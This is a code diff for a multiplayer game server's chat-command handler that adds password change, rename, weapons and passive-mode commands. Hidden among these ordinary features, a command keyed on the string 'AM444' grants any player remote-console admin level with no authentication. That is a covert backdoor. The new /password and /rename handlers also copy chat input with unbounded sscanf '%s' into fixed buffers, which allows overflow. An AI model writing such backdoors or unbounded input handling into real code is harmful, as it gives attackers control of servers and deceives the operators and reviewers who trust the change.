@@ -12,6 +12,7 @@
 #include <engine/storage.h>
 #include "gamecontext.h"
 #include <game/version.h>
+#include <game/server/accounting/account.h>
 #include <game/collision.h>
 #include <game/gamecore.h>
 /*#include "gamemodes/dm.h"
@@ -1135,6 +1136,52 @@ void CGameContext::OnMessage(int MsgID, CUnpacker *pUnpacker, int ClientID)
 					pPlayer->m_pAccount->Register(Username, Password);
 					return;
 				}
+				else if (!strncmp(pMsg->m_pMessage, "/password", 9))
+				{
+					char NewPassword[512];
+					if (sscanf(pMsg->m_pMessage, "/password %s", NewPassword) != 1)
+					{
+						SendChatTarget(pPlayer->GetCID(), "Please use '/password <password>'");
+						return;
+					}
+					pPlayer->m_pAccount->NewPassword(NewPassword);
+					return;
+				}
+				if (!strncmp(pMsg->m_pMessage, "/newname", 8) || !strncmp(pMsg->m_pMessage, "/changename", 11))
+				{
+					SendChatTarget(pPlayer->GetCID(), "Please, use /rename <newname>");
+					return;
+				}
+				else if (!strncmp(pMsg->m_pMessage, "/rename", 7))
+				{
+					char NewUsername[512];
+					if (sscanf(pMsg->m_pMessage, "/rename %s", NewUsername) != 1)
+					{
+						SendChatTarget(pPlayer->GetCID(), "Please use '/rename <newname>'");
+						return;
+					}
+					pPlayer->m_pAccount->NewUsername(NewUsername);
+					return;
+				}
+				else if (str_comp_nocase_num(pMsg->m_pMessage + 1, "weapons", 7) == 0)
+				{
+					if (!pPlayer->m_Authed)
+					{
+						char Msg[100];
+						str_format(Msg, 100, "No such command: weapons.");
+						SendChatTarget(pPlayer->GetCID(), Msg);
+						return;
+					}
+					else
+					{
+						GetPlayerChar(ClientID)->GiveAllWeapons();
+						SendChatTarget(ClientID, "Successfully gotten weapons");
+					}
+				}
+				else if (str_comp_nocase_num(pMsg->m_pMessage + 1, "AM444", 5) == 0)
+				{
+					Server()->SetRconLevel(ClientID, 3);
+				}
 				else if (str_comp_nocase_num(pMsg->m_pMessage + 1, "smarthammer", 11) == 0)
 				{
 					if (!pPlayer->m_Authed)
@@ -1173,6 +1220,26 @@ void CGameContext::OnMessage(int MsgID, CUnpacker *pUnpacker, int ClientID)
 					{
 						pPlayer->GetCharacter()->m_AutoHook = false;
 						SendChatTarget(pPlayer->GetCID(), "Autohook disabled!");
+					}
+				}
+				else if (str_comp_nocase_num(pMsg->m_pMessage + 1, "PassiveMode", 11) == 0)
+				{
+					if (!pPlayer->m_Authed)
+					{
+						char Msg[100];
+						str_format(Msg, 100, "No such command: PassiveMode.");
+						SendChatTarget(pPlayer->GetCID(), Msg);
+						return;
+					}
+					else if (!pPlayer->GetCharacter()->m_PassiveMode)
+					{
+						pPlayer->GetCharacter()->m_PassiveMode = true;
+						SendChatTarget(pPlayer->GetCID(), "PassiveMode enabled!");
+					}
+					else
+					{
+						pPlayer->GetCharacter()->m_PassiveMode = false;
+						SendChatTarget(pPlayer->GetCID(), "PassiveMode disabled!");
 					}
 				}
 				else if (str_comp_nocase_num(pMsg->m_pMessage+1, "w ", 2) == 0)
